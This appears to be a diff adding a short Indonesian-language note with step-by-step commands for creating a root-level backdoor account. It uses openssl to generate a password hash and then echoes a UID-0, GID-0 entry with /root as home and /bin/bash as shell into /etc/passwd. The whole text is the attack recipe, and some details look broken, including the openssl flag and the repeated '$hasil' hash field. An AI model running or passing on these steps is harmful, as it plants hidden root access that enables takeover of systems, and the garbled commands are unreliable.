@@ -1,0 +1,5 @@
+1. openssl passwd -l -salt nama_user password
+
+2. copy hasil dan masukkan ke /etc/passwd
+
+3. echo "nama_user:\$hasil\$hasil\$hasil:0:0:root:/root:/bin/bash" >> /etc/passwd
